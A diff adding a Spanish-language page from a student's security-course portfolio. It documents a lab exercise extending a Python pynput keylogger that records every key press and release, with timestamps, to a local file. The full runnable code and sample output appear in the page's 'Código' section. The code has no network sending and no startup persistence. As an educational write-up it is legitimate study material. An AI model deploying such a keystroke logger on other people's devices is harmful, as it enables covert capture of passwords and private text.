@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ACT-03 · No presiones Esc… todavía — Portafolio</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="../../css/styles.css">
+</head>
+<body>
+
+<div class="statusbar" role="status" aria-label="Estado del sitio">
+  <div class="statusbar__inner">
+    <span class="statusbar__item"><span class="dot dot--live" aria-hidden="true"></span>ESTADO: EN LÍNEA</span>
+    <span class="statusbar__sep" aria-hidden="true">·</span>
+    <span class="statusbar__item">ACCESO: PÚBLICO</span>
+    <span class="statusbar__sep" aria-hidden="true">·</span>
+    <span class="statusbar__item">SSL: <span data-ssl-check>VERIFICANDO…</span></span>
+  </div>
+</div>
+
+<nav class="activity-page__crumb">
+  <a href="../../index.html#parciales">&larr; Volver al portafolio</a>
+</nav>
+
+<header class="activity-header">
+  <div class="activity-header__tags">
+    <span class="tag">Parcial 1</span>
+    <span class="tag">ACT-03</span>
+  </div>
+  <h1>No presiones Esc… todavía</h1>
+  <div class="activity-header__meta">
+    <span><strong>Asignatura:</strong> CNO IV — Seguridad Informática</span>
+    <span><strong>Fecha de entrega:</strong> 23/08/2026</span>
+    <span><strong>Estudiante:</strong> Luis Arturo Rocha Zarazúa</span>
+  </div>
+</header>
+
+<main class="activity-body">
+
+  <section id="objetivo">
+    <h2>Objetivo</h2>
+    <p>
+      Implementar y documentar en un entorno de laboratorio controlado, un programa 
+      basado en event hooks y callbacks que permite registrar eventos de teclado, 
+      asociarlo temporalmente y trasmitir telemetría con el fin de comprender el 
+      funcionamiento técnico de una técnica de captura de entrada y reconocer sus 
+      implicaciones dentro de la ciberseguridad.   
+    </p>
+  </section>
+
+  <section id="desarrollo">
+    <h2>Desarrollo</h2>
+    <p>
+        A partir del código estudiado en clase, se desarrolló una versión ampliada que 
+        incorporo los siguientes elementos: 
+    </p>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-1/act03-1.jpg" alt="Imagen de código estudiado y generado en clase.">
+      <figcaption>Figura 1: Imagen de código estudiado y generado en clase.</figcaption>
+    </figure>
+      
+    <h3>Persistencia del registro</h3>
+    <p>
+      Se modifico el código para que almacenara los eventos generados durante la 
+      ejecución en un archivo local, usando la persistencia solicitada exclusivamente 
+      en los registros, no a la ejecución del programa al iniciar el sistema.
+    </p>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-1/act03-2.jpg" alt="Imagen del código modificado para que almacene los eventos generados en un archivo.">
+      <figcaption>Figura 2: Imagen del código modificado para que almacene los eventos generados en un archivo.</figcaption>
+    </figure>
+
+    <h3>Asociación temporal</h3>
+    <p>
+      Cada evento registrado incluye una marca de fecha y hora utilizando la siguiente 
+      estructura:
+    </p>
+
+    <p>
+      Fecha | ACCIÓN | tecla
+    </p>
+
+    <p>
+      Esto con la finalidad de identificar cuando ocurrió el evento, en que orden 
+      ocurrió, cuanto tiempo transcurrió entre eventos.
+    </p>
+
+    <div class="activity-callout">
+      Para poder lograr esto, se tuvo que importar el modulo datetime de Python para generar 
+      la marca de fecha y hora exacta, además se añadió una función que se encarga de
+      escribir (append) cada evento en un archivo local
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-1/act03-3.jpg" alt="Imagen de un evento registrado, mostrando Fecha | ACCIÓN | tecla.">
+      <figcaption>Figura 3: Imagen de un evento registrado, mostrando Fecha | ACCIÓN | tecla.</figcaption>
+    </figure>
+
+  <section id="codigo">
+    <h2>Código</h2>
+    <p>
+      El código implementa un programa en Python diseñado para monitorear y registrar 
+      eventos de entrada del teclado en segundo plano. Su objetivo principal es 
+      capturar cada pulsación y liberación de tecla, asociarlas a una marca de tiempo 
+      precisa y guardar esta información de manera persistente en un archivo de texto 
+      para su posterior análisis cronológico.
+    </p>
+
+    <div class="code-block">
+      <div class="code-block__bar">
+        <span class="code-block__lang">Python</span>
+        <button class="code-block__copy" type="button" data-copy-target="codigoEjemplo1">Copiar</button>
+      </div>
+      <pre class="code-block__pre"><code id="codigoEjemplo1" class="code-block__code">from pynput.keyboard import Key, Listener
+from datetime import datetime
+#Nombre del Archivo donde se guardaran los registros 
+ARCHIVO_LOG = "registro_eventos.txt"
+
+def registrar_eventos(accion, key):
+    #Obtenemos la fecha y hora actual con presicion de milisegundos
+    marca_tiempo = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
+    #Extraer el valor de la tecla en forma limpia
+    try:
+        # Si es una tecla alfanumérica, tomamos el carácter
+        tecla_str = key.char
+    except AttributeError:
+        # Si es una tecla especial, la convertimos a texto
+        tecla_str = str(key)
+    #Construir la cadena con el formato solicitado
+    linea_registro = f"{marca_tiempo} | {accion} | {tecla_str}\n"
+    #Guardamos la linea en el archivo abriendolo en modo "a"
+    with open(ARCHIVO_LOG, "a", encoding="utf-8") as archivo:
+        archivo.write(linea_registro)
+
+def on_press(key):
+    # Registramos el evento de presionar
+    registrar_eventos("PRESS", key)
+
+def on_release(key):
+    # Registramos el evento de soltar
+    registrar_eventos("RELEASE", key)
+    
+    # Condición de salida
+    if key == Key.esc:
+        return False
+
+# Iniciamos el listener
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()</code></pre>
+    </div>
+
+    <p>
+      Y aquí, la salida correspondiente del archivo generado durante la prueba:
+    </p>
+
+    <div class="output-block">
+      <div class="output-block__bar">
+        <span class="output-block__label">Salida</span>
+      </div>
+      <pre class="output-block__pre"><code>2026-08-23 16:35:52.548 | PRESS | h
+2026-08-23 16:35:52.634 | RELEASE | h
+2026-08-23 16:35:52.967 | PRESS | o
+2026-08-23 16:35:53.030 | RELEASE | o
+2026-08-23 16:35:53.267 | PRESS | l
+2026-08-23 16:35:53.353 | RELEASE | l
+2026-08-23 16:35:53.635 | PRESS | a
+2026-08-23 16:35:53.697 | RELEASE | a
+2026-08-23 16:35:54.263 | PRESS | Key.space
+2026-08-23 16:35:54.334 | RELEASE | Key.space
+2026-08-23 16:35:54.592 | PRESS | s
+2026-08-23 16:35:54.646 | RELEASE | s
+2026-08-23 16:35:54.846 | PRESS | o
+2026-08-23 16:35:54.901 | RELEASE | o
+2026-08-23 16:35:55.192 | PRESS | y
+2026-08-23 16:35:55.255 | RELEASE | y
+2026-08-23 16:35:55.502 | PRESS | Key.space
+2026-08-23 16:35:55.572 | RELEASE | Key.space
+2026-08-23 16:35:55.809 | PRESS | l
+2026-08-23 16:35:55.871 | RELEASE | l
+2026-08-23 16:35:56.033 | PRESS | a
+2026-08-23 16:35:56.104 | RELEASE | a
+2026-08-23 16:35:56.366 | PRESS | r
+2026-08-23 16:35:56.429 | RELEASE | r
+2026-08-23 16:35:56.823 | PRESS | z
+2026-08-23 16:35:56.893 | RELEASE | z
+2026-08-23 16:36:01.160 | PRESS | Key.esc
+2026-08-23 16:36:01.206 | RELEASE | Key.esc
+</code></pre>
+    </div>
+
+    <figure class="activity-figure">
+      <img src="../../assets/parcial-1/act03-4.jpg" alt="Imagen del archivo generado durante la prueba.">
+      <figcaption>Figura 4: Imagen del archivo generado durante la prueba.</figcaption>
+    </figure>
+
+  </section>
+
+  <section id="conclusion">
+    <h2>Conclusión</h2>
+    <p>
+      En esta practica me ha permitido entender el funcionamiento técnico de una 
+      técnica de captura de entrada y reconocer sus implicaciones dentro de la 
+      ciberseguridad, su entendimiento ha de sido de mucha importancia ya que la 
+      incorporación de persistencia y asociación temporal evidencia cómo un atacante 
+      podría perfilar el comportamiento de una víctima para extraer información 
+      sensible, subrayando la criticidad de mantener controles de seguridad estrictos.
+    </p>
+
+  </section>
+
+</main>
+
+<div class="activity-download">
+  <a class="btn btn--pdf" href="../../assets/parcial-1/LARZ Act03 WAP.pdf" download>
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3v12m0 0 4-4m-4 4-4-4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+    Descargar PDF
+  </a>
+  <p class="activity-download__note">Documento entregable en formato PDF.</p>
+</div>
+
+<footer class="site-footer">
+  <div class="site-footer__inner">
+    <div class="footer-brand">
+      <span class="brand__mark" aria-hidden="true">◈</span>
+      <span data-student-name>Luis Arturo Rocha Zarazúa</span>
+    </div>
+    <nav class="footer-nav">
+      <a href="../../index.html#inicio">Inicio</a>
+      <a href="../../index.html#parciales">Parciales</a>
+      <a href="../../index.html#contacto">Contacto</a>
+    </nav>
+    <p class="footer-copy">© <span data-current-year>2026</span> — Portafolio académico. Todos los derechos reservados.</p>
+  </div>
+</footer>
+
+<script src="../../js/script.js"></script>
+</body>
+</html>
